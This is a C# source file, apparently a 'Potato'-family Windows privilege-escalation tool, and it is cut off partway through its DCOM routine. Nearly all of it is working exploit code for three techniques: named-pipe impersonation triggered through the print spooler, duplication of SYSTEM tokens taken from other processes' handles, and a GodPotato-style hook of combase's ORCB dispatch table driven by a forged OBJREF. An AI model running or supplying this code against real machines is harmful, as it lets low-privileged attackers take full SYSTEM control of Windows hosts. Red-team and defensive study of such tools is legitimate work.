using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class Potato
{
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr CreateNamedPipeW(string n, uint om, uint pm, uint mi, uint ob, uint ib, uint to, IntPtr sa);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ConnectNamedPipe(IntPtr h, IntPtr ov);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DisconnectNamedPipe(IntPtr h);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern IntPtr CreateFileW(string n, uint a, uint s, IntPtr sa, uint d, uint f, IntPtr t);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint da, bool ih, int pid);
    [DllImport("kernel32.dll")]
    static extern bool GetExitCodeProcess(IntPtr h, out uint code);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr GetModuleHandleW(string lpModuleName);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateNamedPipeClient(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool DuplicateTokenEx(IntPtr h, uint a, IntPtr at, int il, int tt, out IntPtr nt);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessAsUserW(IntPtr ht, string an, StringBuilder cl, IntPtr pa, IntPtr ta, bool ih, uint cf, IntPtr env, string cwd, ref SI si, out PI pi);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool CreateProcessWithTokenW(IntPtr ht, uint lf, string an, StringBuilder cl, uint cf, IntPtr env, string cwd, ref SI si, out PI pi);
    [DllImport("advapi32.dll")]
    static extern bool RevertToSelf();
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr h);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool GetTokenInformation(IntPtr tok, int cls, IntPtr buf, int len, out int rlen);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool ConvertSidToStringSidW(IntPtr sid, out IntPtr str);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenThreadToken(IntPtr th, uint da, bool self, out IntPtr tok);
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool AdjustTokenPrivileges(IntPtr tok, bool dis, ref TP newState, int bufLen, IntPtr prev, IntPtr retLen);
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern bool LookupPrivilegeValueW(string sys, string name, out long luid);
    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentThread();
    [DllImport("kernel32.dll")]
    static extern IntPtr LocalFree(IntPtr h);

    [StructLayout(LayoutKind.Sequential)]
    struct TP { public int Count; public long Luid; public int Attr; }

    [DllImport("userenv.dll", SetLastError = true)]
    static extern bool CreateEnvironmentBlock(out IntPtr env, IntPtr token, bool inherit);
    [DllImport("userenv.dll")]
    static extern bool DestroyEnvironmentBlock(IntPtr env);

    [DllImport("ntdll.dll")]
    static extern uint NtQuerySystemInformation(uint cls, IntPtr buf, uint len, out uint rlen);
    [DllImport("ntdll.dll")]
    static extern uint NtDuplicateObject(IntPtr src, IntPtr srcH, IntPtr tgt, out IntPtr tgtH, uint da, uint attr, uint opt);

    [DllImport("winspool.drv", CharSet = CharSet.Unicode, SetLastError = true)]
    static extern bool OpenPrinterW(string n, out IntPtr h, IntPtr d);
    [DllImport("winspool.drv")]
    static extern bool ClosePrinter(IntPtr h);

    [DllImport("ole32.dll")]
    static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);
    [DllImport("ole32.dll")]
    static extern int CreateStreamOnHGlobal(IntPtr hGlobal, bool fDelete, out IntPtr ppstm);
    [DllImport("ole32.dll")]
    static extern int CoUnmarshalInterface(IntPtr pStm, ref Guid riid, out IntPtr ppv);
    [DllImport("ole32.dll")]
    static extern int CreateObjrefMoniker(IntPtr punk, out IntPtr ppmk);
    [DllImport("ole32.dll")]
    static extern int CreateBindCtx(uint reserved, out IntPtr ppbc);
    [DllImport("ole32.dll")]
    static extern void CoTaskMemFree(IntPtr pv);
    [DllImport("ole32.dll")]
    static extern void CoUninitialize();

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int StreamWriteFn(IntPtr pThis, IntPtr pv, uint cb, IntPtr written);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int StreamSeekFn(IntPtr pThis, long move, uint origin, IntPtr newPos);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate int MonikerGetDisplayNameFn(IntPtr pThis, IntPtr pbc, IntPtr pmkToLeft, out IntPtr ppszDisplayName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk4Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk5Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk6Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk7Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk8Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk9Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk10Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk11Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j, IntPtr k);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk12Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j, IntPtr k, IntPtr l);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk13Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)] delegate int Hk14Fn(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m, IntPtr n);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct SI
    {
        public int cb; public string r1, desk, title;
        public int x, y, xs, ys, xc, yc, fa, fl;
        public short sw, r2; public IntPtr r3, hIn, hOut, hErr;
    }
    [StructLayout(LayoutKind.Sequential)]
    struct PI { public IntPtr hProc, hThread; public int pid, tid; }

    static readonly IntPtr BAD = new IntPtr(-1);
    static IntPtr _sysToken = IntPtr.Zero;
    static volatile bool _got = false;
    static ManualResetEvent _pipeReady = new ManualResetEvent(false);

    static string GetTokenSid(IntPtr token)
    {
        int len = 0;
        GetTokenInformation(token, 1, IntPtr.Zero, 0, out len);
        if (len == 0) return null;
        IntPtr buf = Marshal.AllocHGlobal(len);
        if (!GetTokenInformation(token, 1, buf, len, out len))
        { Marshal.FreeHGlobal(buf); return null; }
        IntPtr sid = Marshal.ReadIntPtr(buf);
        IntPtr sidStr;
        if (!ConvertSidToStringSidW(sid, out sidStr))
        { Marshal.FreeHGlobal(buf); return null; }
        string result = Marshal.PtrToStringUni(sidStr);
        LocalFree(sidStr);
        Marshal.FreeHGlobal(buf);
        return result;
    }

    static int GetTokenImpLevel(IntPtr token)
    {
        int len = 0;
        GetTokenInformation(token, 9, IntPtr.Zero, 0, out len);
        if (len == 0) return -1;
        IntPtr buf = Marshal.AllocHGlobal(len);
        if (!GetTokenInformation(token, 9, buf, len, out len))
        { Marshal.FreeHGlobal(buf); return -1; }
        int level = Marshal.ReadInt32(buf);
        Marshal.FreeHGlobal(buf);
        return level;
    }

    static int GetTokenType(IntPtr token)
    {
        int len = 0;
        GetTokenInformation(token, 8, IntPtr.Zero, 0, out len);
        if (len == 0) return -1;
        IntPtr buf = Marshal.AllocHGlobal(len);
        if (!GetTokenInformation(token, 8, buf, len, out len))
        { Marshal.FreeHGlobal(buf); return -1; }
        int tt = Marshal.ReadInt32(buf);
        Marshal.FreeHGlobal(buf);
        return tt;
    }

    static string _lastDiag = "";
    static string _pipeDiag = "";

    static bool EnableDebugPriv()
    {
        IntPtr tok;
        if (!OpenThreadToken(GetCurrentThread(), 0x0020 | 0x0008, false, out tok)) return false;
        long luid;
        if (!LookupPrivilegeValueW(null, "SeDebugPrivilege", out luid))
        { CloseHandle(tok); return false; }
        var tp = new TP { Count = 1, Luid = luid, Attr = 2 };
        bool ok = AdjustTokenPrivileges(tok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        CloseHandle(tok);
        return ok && Marshal.GetLastWin32Error() == 0;
    }

    static IntPtr FindSystemTokenViaHandles()
    {
        const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;

        uint bufSize = 0x10000;
        IntPtr buf = Marshal.AllocHGlobal((int)bufSize);
        uint retLen;

        while (NtQuerySystemInformation(0x40, buf, bufSize, out retLen) == STATUS_INFO_LENGTH_MISMATCH)
        {
            Marshal.FreeHGlobal(buf);
            bufSize *= 2;
            buf = Marshal.AllocHGlobal((int)bufSize);
        }

        long count;
        int entrySize, headerSize;
        if (IntPtr.Size == 8)
        { count = Marshal.ReadInt64(buf, 0); headerSize = 16; entrySize = 40; }
        else
        { count = Marshal.ReadInt32(buf, 0); headerSize = 8; entrySize = 28; }

        int myPid = Process.GetCurrentProcess().Id;
        IntPtr myProc = GetCurrentProcess();
        int selfHandles = 0, selfSysToks = 0;

        for (long i = 0; i < count; i++)
        {
            IntPtr entry = new IntPtr(buf.ToInt64() + headerSize + i * entrySize);
            long pid;
            IntPtr handle;
            if (IntPtr.Size == 8)
            { pid = Marshal.ReadInt64(entry, 8); handle = Marshal.ReadIntPtr(entry, 16); }
            else
            { pid = Marshal.ReadInt32(entry, 4); handle = Marshal.ReadIntPtr(entry, 8); }

            if (pid != myPid) continue;
            selfHandles++;

            string sid = GetTokenSid(handle);
            if (sid != "S-1-5-18") continue;
            selfSysToks++;

            int tokType = GetTokenType(handle);
            int impLevel = (tokType == 2) ? GetTokenImpLevel(handle) : -1;

            if (tokType == 1 || impLevel >= 2)
            {
                IntPtr primary;
                if (DuplicateTokenEx(handle, 0xF01FF, IntPtr.Zero, 2, 1, out primary))
                { Marshal.FreeHGlobal(buf); return primary; }
            }
        }

        int lastPid = -1;
        IntPtr lastProcHandle = IntPtr.Zero;
        int opened = 0, duped = 0, sysToks = 0;

        for (long i = 0; i < count; i++)
        {
            IntPtr entry = new IntPtr(buf.ToInt64() + headerSize + i * entrySize);
            long pid;
            IntPtr handle;
            if (IntPtr.Size == 8)
            { pid = Marshal.ReadInt64(entry, 8); handle = Marshal.ReadIntPtr(entry, 16); }
            else
            { pid = Marshal.ReadInt32(entry, 4); handle = Marshal.ReadIntPtr(entry, 8); }

            if (pid == myPid || pid <= 4) continue;

            if ((int)pid != lastPid)
            {
                if (lastProcHandle != IntPtr.Zero) CloseHandle(lastProcHandle);
                lastProcHandle = OpenProcess(0x0440, false, (int)pid);
                if (lastProcHandle == IntPtr.Zero)
                    lastProcHandle = OpenProcess(0x0040, false, (int)pid);
                lastPid = (int)pid;
                if (lastProcHandle != IntPtr.Zero) opened++;
            }
            if (lastProcHandle == IntPtr.Zero) continue;

            IntPtr dupHandle;
            if (NtDuplicateObject(lastProcHandle, handle, myProc, out dupHandle, 0, 0, 2) != 0) continue;
            duped++;

            string sid = GetTokenSid(dupHandle);
            if (sid == "S-1-5-18")
            {
                sysToks++;
                int tokType = GetTokenType(dupHandle);
                int impLevel = (tokType == 2) ? GetTokenImpLevel(dupHandle) : -1;

                if (tokType == 1 || impLevel >= 2)
                {
                    IntPtr primary;
                    if (DuplicateTokenEx(dupHandle, 0xF01FF, IntPtr.Zero, 2, 1, out primary))
                    {
                        CloseHandle(dupHandle);
                        if (lastProcHandle != IntPtr.Zero) CloseHandle(lastProcHandle);
                        Marshal.FreeHGlobal(buf);
                        return primary;
                    }
                }
            }
            CloseHandle(dupHandle);
        }

        if (lastProcHandle != IntPtr.Zero) CloseHandle(lastProcHandle);
        Marshal.FreeHGlobal(buf);
        _lastDiag = "handles=" + count + ",self=" + selfHandles + ",selfSys=" + selfSysToks
            + ",procsOpened=" + opened + ",duped=" + duped + ",sysToks=" + sysToks;
        return IntPtr.Zero;
    }

    static void PipeServer(string path)
    {
        IntPtr hp = CreateNamedPipeW(path, 3, 0, 10, 4096, 4096, 0, IntPtr.Zero);
        if (hp == BAD) { _pipeReady.Set(); return; }
        _pipeReady.Set();
        ConnectNamedPipe(hp, IntPtr.Zero);

        if (ImpersonateNamedPipeClient(hp))
        {
            string pipeId = WindowsIdentity.GetCurrent().Name;
            _pipeDiag = "pipeClient=" + pipeId;

            IntPtr threadTok;
            if (OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out threadTok))
            {
                string sid = GetTokenSid(threadTok);
                if (sid == "S-1-5-18")
                {
                    IntPtr primary;
                    if (DuplicateTokenEx(threadTok, 0xF01FF, IntPtr.Zero, 2, 1, out primary))
                    {
                        _sysToken = primary; _got = true;
                        _pipeDiag += ",directToken=SYSTEM";
                    }
                    CloseHandle(threadTok);
                }
                else
                {
                    CloseHandle(threadTok);
                    bool dbg = EnableDebugPriv();
                    _pipeDiag += ",debugPriv=" + (dbg ? "enabled" : "unavail");

                    IntPtr sysToken = FindSystemTokenViaHandles();
                    _pipeDiag += ",imp_" + _lastDiag;
                    if (sysToken != IntPtr.Zero)
                    { _sysToken = sysToken; _got = true; }
                }
            }
            RevertToSelf();
        }
        else
        {
            _pipeDiag = "impersonateFailed=" + Marshal.GetLastWin32Error();
        }

        if (!_got)
        {
            IntPtr sysToken = FindSystemTokenViaHandles();
            _pipeDiag += ",noImp_" + _lastDiag;
            if (sysToken != IntPtr.Zero)
            { _sysToken = sysToken; _got = true; }
        }

        DisconnectNamedPipe(hp); CloseHandle(hp);
    }

    static bool RunSpoofer(int timeout)
    {
        _got = false; _pipeReady.Reset();
        var rng = new Random();
        string rnd = ""; for (int i = 0; i < 8; i++) rnd += "abcdefghijklmno"[rng.Next(15)];
        string pp = @"\\.\pipe\" + rnd + @"\pipe\spoolss";
        string trig = @"\\localhost/pipe/" + rnd;

        new Thread(() => PipeServer(pp)) { IsBackground = true }.Start();
        if (!_pipeReady.WaitOne(5000)) return false;

        new Thread(() => { Thread.Sleep(300);
            IntPtr hp; OpenPrinterW(trig, out hp, IntPtr.Zero);
            if (hp != IntPtr.Zero) ClosePrinter(hp);
        }) { IsBackground = true }.Start();

        for (int w = 0; w < timeout && !_got; w += 100) Thread.Sleep(100);
        return _got;
    }

    static bool SpoolerUp()
    {
        IntPtr h = CreateFileW(@"\\.\pipe\spoolss", 0x80000000u, 1, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h != BAD) { CloseHandle(h); return true; }
        return false;
    }

    static bool RunDirect()
    {
        _got = false;
        IntPtr sysToken = FindSystemTokenViaHandles();
        if (sysToken != IntPtr.Zero)
        { _sysToken = sysToken; _got = true; }
        return _got;
    }

    // ===== DCOM / GodPotato ORCB hook technique =====

    static string _dcomDiag = "";
    static string _clientPipe;
    static Delegate _hookDelegate;
    static IntPtr _origUseProtseq;
    static IntPtr _dispatchEntryAddr;
    static volatile int _hookCallCount;

    static int WriteBindings(IntPtr ppdsaOut)
    {
        _hookCallCount++;
        string[] endpoints = { _clientPipe, "ncacn_ip_tcp:safe !" };
        int entrySize = 3;
        foreach (var ep in endpoints) entrySize += ep.Length + 1;
        int memSize = entrySize * 2 + 10;
        IntPtr pdsa = Marshal.AllocHGlobal(memSize);
        for (int i = 0; i < memSize; i++) Marshal.WriteByte(pdsa, i, 0);
        Marshal.WriteInt16(pdsa, 0, (short)entrySize);
        Marshal.WriteInt16(pdsa, 2, (short)(entrySize - 2));
        int off = 4;
        foreach (var ep in endpoints)
        {
            foreach (char c in ep) { Marshal.WriteInt16(pdsa, off, (short)c); off += 2; }
            off += 2;
        }
        Marshal.WriteIntPtr(ppdsaOut, pdsa);
        return 0;
    }

    static int O4(IntPtr a, IntPtr b, IntPtr c, IntPtr d) { return WriteBindings(c); }
    static int O5(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e) { return WriteBindings(d); }
    static int O6(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f) { return WriteBindings(e); }
    static int O7(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g) { return WriteBindings(f); }
    static int O8(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2) { return WriteBindings(g); }
    static int O9(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i) { return WriteBindings(h2); }
    static int O10(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j) { return WriteBindings(i); }
    static int O11(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j, IntPtr k) { return WriteBindings(j); }
    static int O12(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j, IntPtr k, IntPtr l) { return WriteBindings(k); }
    static int O13(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m) { return WriteBindings(l); }
    static int O14(IntPtr a, IntPtr b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g, IntPtr h2, IntPtr i, IntPtr j, IntPtr k, IntPtr l, IntPtr m, IntPtr n) { return WriteBindings(m); }

    static bool HookOrcbDispatchTable()
    {
        IntPtr combase = GetModuleHandleW("combase.dll");
        if (combase == IntPtr.Zero) { _dcomDiag += ",noCombase"; return false; }

        int peOff = Marshal.ReadInt32(combase, 0x3C);
        int imageSize = Marshal.ReadInt32(combase, peOff + 24 + 56);

        byte[] guidBytes = new Guid("18f70770-8e64-11cf-9af1-0020af6e72f4").ToByteArray();
        int ptrSize = IntPtr.Size;
        int structSize = (ptrSize == 8) ? 0x60 : 0x44;
        byte[] pattern = new byte[4 + guidBytes.Length];
        pattern[0] = (byte)(structSize & 0xFF);
        pattern[1] = (byte)((structSize >> 8) & 0xFF);
        Array.Copy(guidBytes, 0, pattern, 4, guidBytes.Length);

        byte[] dllBytes;
        try
        {
            dllBytes = new byte[imageSize];
            Marshal.Copy(combase, dllBytes, 0, imageSize);
        }
        catch { _dcomDiag += ",scanFail"; return false; }

        int matchOffset = -1;
        for (int i = 0; i <= dllBytes.Length - pattern.Length; i++)
        {
            if (dllBytes[i] != pattern[0]) continue;
            bool found = true;
            for (int j = 1; j < pattern.Length; j++)
            {
                if (dllBytes[i + j] != pattern[j]) { found = false; break; }
            }
            if (found) { matchOffset = i; break; }
        }

        if (matchOffset < 0) { _dcomDiag += ",guidNotFound"; return false; }

        IntPtr structAddr = new IntPtr(combase.ToInt64() + matchOffset);
        int interpInfoOffset = (ptrSize == 8) ? 80 : 60;
        IntPtr midlServerInfo = Marshal.ReadIntPtr(structAddr, interpInfoOffset);
        if (midlServerInfo == IntPtr.Zero) { _dcomDiag += ",noMidlInfo"; return false; }

        IntPtr dispatchTable = Marshal.ReadIntPtr(midlServerInfo, ptrSize);
        IntPtr procString = Marshal.ReadIntPtr(midlServerInfo, 2 * ptrSize);
        IntPtr fmtStringOffset = Marshal.ReadIntPtr(midlServerInfo, 3 * ptrSize);

        if (dispatchTable == IntPtr.Zero || procString == IntPtr.Zero || fmtStringOffset == IntPtr.Zero)
        { _dcomDiag += ",nullPtrs"; return false; }

        ushort firstFmtOff = (ushort)Marshal.ReadInt16(fmtStringOffset, 0);
        int paramCount = Marshal.ReadByte(procString, firstFmtOff + 19);
        _dcomDiag += ",params=" + paramCount;

        if (paramCount < 4 || paramCount > 14) { _dcomDiag += ",badParams"; return false; }

        _origUseProtseq = Marshal.ReadIntPtr(dispatchTable, 0);
        _dispatchEntryAddr = dispatchTable;

        switch (paramCount)
        {
            case 4: _hookDelegate = new Hk4Fn(O4); break;
            case 5: _hookDelegate = new Hk5Fn(O5); break;
            case 6: _hookDelegate = new Hk6Fn(O6); break;
            case 7: _hookDelegate = new Hk7Fn(O7); break;
            case 8: _hookDelegate = new Hk8Fn(O8); break;
            case 9: _hookDelegate = new Hk9Fn(O9); break;
            case 10: _hookDelegate = new Hk10Fn(O10); break;
            case 11: _hookDelegate = new Hk11Fn(O11); break;
            case 12: _hookDelegate = new Hk12Fn(O12); break;
            case 13: _hookDelegate = new Hk13Fn(O13); break;
            case 14: _hookDelegate = new Hk14Fn(O14); break;
        }
        IntPtr hookPtr = Marshal.GetFunctionPointerForDelegate(_hookDelegate);

        uint oldProtect;
        if (!VirtualProtect(dispatchTable, (UIntPtr)ptrSize, 0x40, out oldProtect))
        { _dcomDiag += ",vpFail=" + Marshal.GetLastWin32Error(); return false; }

        Marshal.WriteIntPtr(dispatchTable, 0, hookPtr);
        _dcomDiag += ",hooked,dt=0x" + dispatchTable.ToString("X") + ",orig=0x" + _origUseProtseq.ToString("X");
        return true;
    }

    static void RestoreOrcbHook()
    {
        if (_origUseProtseq != IntPtr.Zero && _dispatchEntryAddr != IntPtr.Zero)
        {
            Marshal.WriteIntPtr(_dispatchEntryAddr, 0, _origUseProtseq);
            _origUseProtseq = IntPtr.Zero;
        }
    }

    static void DCOMPipeServer(string path)
    {
        IntPtr hp = CreateNamedPipeW(path, 3, 0, 10, 4096, 4096, 0, IntPtr.Zero);
        if (hp == BAD) { _dcomDiag += ",pipeCreateFail"; _pipeReady.Set(); return; }
        _pipeReady.Set();
        ConnectNamedPipe(hp, IntPtr.Zero);

        if (ImpersonateNamedPipeClient(hp))
        {
            string pipeId = WindowsIdentity.GetCurrent().Name;
            _dcomDiag += ",dcomClient=" + pipeId;

            IntPtr threadTok;
            if (OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out threadTok))
            {
                string sid = GetTokenSid(threadTok);
                if (sid == "S-1-5-18")
                {
                    int impLevel = GetTokenImpLevel(threadTok);
                    if (impLevel >= 2)
                    {
                        IntPtr primary;
                        if (DuplicateTokenEx(threadTok, 0xF01FF, IntPtr.Zero, 2, 1, out primary))
                        { _sysToken = primary; _got = true; _dcomDiag += ",directSystem"; }
                    }
                    else _dcomDiag += ",lowImp=" + impLevel;
                }
                else _dcomDiag += ",pipeSid=" + sid;
                CloseHandle(threadTok);

                if (!_got)
                {
                    EnableDebugPriv();
                    IntPtr sysToken = FindSystemTokenViaHandles();
                    _dcomDiag += ",hunt=" + _lastDiag;
                    if (sysToken != IntPtr.Zero) { _sysToken = sysToken; _got = true; }
                }
            }
            RevertToSelf();
        }
        else
        {
            _dcomDiag += ",impFail=" + Marshal.GetLastWin32Error();
        }

        DisconnectNamedPipe(hp); CloseHandle(hp);
    }

    static byte[] BuildTriggerObjRef(byte[] oxid, byte[] oid, byte[] ipid)
    {
        var ms = new MemoryStream();
        var bw = new BinaryWriter(ms);
        bw.Write(0x574F454Du);
        bw.Write(1u);
        bw.Write(new Guid("00000000-0000-0000-C000-000000000046").ToByteArray());
        bw.Write(0u); bw.Write(1u);
        bw.Write(oxid); bw.Write(oid); bw.Write(ipid);
        string addr = "127.0.0.1";
        int strSize = 1 + addr.Length + 1 + 1;
        int secSize = 1 + 1 + 1 + 1;
        bw.Write((ushort)(strSize + secSize));
        bw.Write((ushort)strSize);
        bw.Write((ushort)7);
        foreach (char c in addr) bw.Write((ushort)c);
        bw.Write((ushort)0); bw.Write((ushort)0);
        bw.Write((ushort)0x0A); bw.Write((ushort)0xFFFF);
        bw.Write((ushort)0); bw.Write((ushort)0);
        return ms.ToArray();
    }

    static void TriggerUnmarshal()
    {
        try
        {
            byte[] oxid = null, oid = null, ipid = null;
            bool oxidOk = false;
            var oxidReady = new ManualResetEvent(false);

            var staThread = new Thread(() =>
            {
                try
                {
                    int initHr = CoInitializeEx(IntPtr.Zero, 2);
                    if (initHr == unchecked((int)0x80010106))
                    {
                        CoUninitialize();
                        initHr = CoInitializeEx(IntPtr.Zero, 2);
                        if (initHr == unchecked((int)0x80010106))
                        {
                            CoUninitialize(); CoUninitialize();
                            initHr = CoInitializeEx(IntPtr.Zero, 2);
                        }
                    }
                    _dcomDiag += ",staInit=0x" + initHr.ToString("X8");
                    IntPtr pUnk = Marshal.GetIUnknownForObject(new object());
                    IntPtr mk; int hr = CreateObjrefMoniker(pUnk, out mk);
                    Marshal.Release(pUnk);
                    if (hr != 0) { _dcomDiag += ",mkFail=0x" + hr.ToString("X8"); oxidReady.Set(); return; }

                    IntPtr bc; CreateBindCtx(0, out bc);
                    IntPtr vt = Marshal.ReadIntPtr(mk);
                    var gdn = (MonikerGetDisplayNameFn)Marshal.GetDelegateForFunctionPointer(
                        Marshal.ReadIntPtr(vt, 20 * IntPtr.Size), typeof(MonikerGetDisplayNameFn));
                    IntPtr dnp; hr = gdn(mk, bc, IntPtr.Zero, out dnp);
                    Marshal.Release(bc); Marshal.Release(mk);
                    if (hr != 0 || dnp == IntPtr.Zero) { _dcomDiag += ",gdnFail"; oxidReady.Set(); return; }

                    string dn = Marshal.PtrToStringUni(dnp);
                    CoTaskMemFree(dnp);
                    string b64 = dn.Replace("objref:", "").Replace(":", "");
                    byte[] ob;
                    try { ob = Convert.FromBase64String(b64); }
                    catch { _dcomDiag += ",b64Fail"; oxidReady.Set(); return; }
                    if (ob.Length < 64) { _dcomDiag += ",shortObj"; oxidReady.Set(); return; }

                    oxid = new byte[8]; oid = new byte[8]; ipid = new byte[16];
                    Array.Copy(ob, 32, oxid, 0, 8);
                    Array.Copy(ob, 40, oid, 0, 8);
                    Array.Copy(ob, 48, ipid, 0, 16);
                    oxidOk = true;
                    oxidReady.Set();

                    for (int w = 0; w < 20000 && !_got; w += 100) Thread.Sleep(100);
                    CoUninitialize();
                }
                catch (Exception ex) { _dcomDiag += ",staErr:" + ex.GetType().Name; oxidReady.Set(); }
            });
            try { staThread.SetApartmentState(ApartmentState.STA); }
            catch { _dcomDiag += ",setAptFail"; }
            staThread.IsBackground = true;
            staThread.Start();

            if (!oxidReady.WaitOne(10000) || !oxidOk) { _dcomDiag += ",oxidFail"; return; }

            CoInitializeEx(IntPtr.Zero, 0);
            byte[] triggerObjRef = BuildTriggerObjRef(oxid, oid, ipid);

            IntPtr pStm;
            int hr2 = CreateStreamOnHGlobal(IntPtr.Zero, true, out pStm);
            if (hr2 != 0) { _dcomDiag += ",streamFail"; return; }

            IntPtr svt = Marshal.ReadIntPtr(pStm);
            var writeFn = (StreamWriteFn)Marshal.GetDelegateForFunctionPointer(
                Marshal.ReadIntPtr(svt, 4 * IntPtr.Size), typeof(StreamWriteFn));
            var seekFn = (StreamSeekFn)Marshal.GetDelegateForFunctionPointer(
                Marshal.ReadIntPtr(svt, 5 * IntPtr.Size), typeof(StreamSeekFn));

            IntPtr objBuf = Marshal.AllocHGlobal(triggerObjRef.Length);
            Marshal.Copy(triggerObjRef, 0, objBuf, triggerObjRef.Length);
            writeFn(pStm, objBuf, (uint)triggerObjRef.Length, IntPtr.Zero);
            Marshal.FreeHGlobal(objBuf);
            seekFn(pStm, 0, 0, IntPtr.Zero);

            Guid iid = new Guid("00000000-0000-0000-C000-000000000046");
            IntPtr ppv;
            hr2 = CoUnmarshalInterface(pStm, ref iid, out ppv);
            _dcomDiag += ",unmarshal=0x" + hr2.ToString("X8");
            Marshal.Release(pStm);
        }
        catch (Exception ex) { _dcomDiag += ",trigErr:" + ex.GetType().Name; }
    }

    static bool RunDCOM()
    {
        _got = false; _dcomDiag = ""; _pipeReady.Reset(); _hookCallCount = 0;
        int pid = Process.GetCurrentProcess().Id;
        string serverPipe = @"\\.\pipe\tater_" + pid + @"\pipe\epmapper";
        _clientPipe = "ncacn_np:localhost/pipe/tater_" + pid + "[\\pipe\\epmapper]";

        // Consume any stale pipe instances from previous invocations
        for (int s = 0; s < 3; s++)
        {
            IntPtr sf = CreateFileW(serverPipe, 0xC0000000u, 0, IntPtr.Zero, 3, 0, IntPtr.Zero);
            if (sf == BAD) break;
            CloseHandle(sf);
            Thread.Sleep(50);
        }

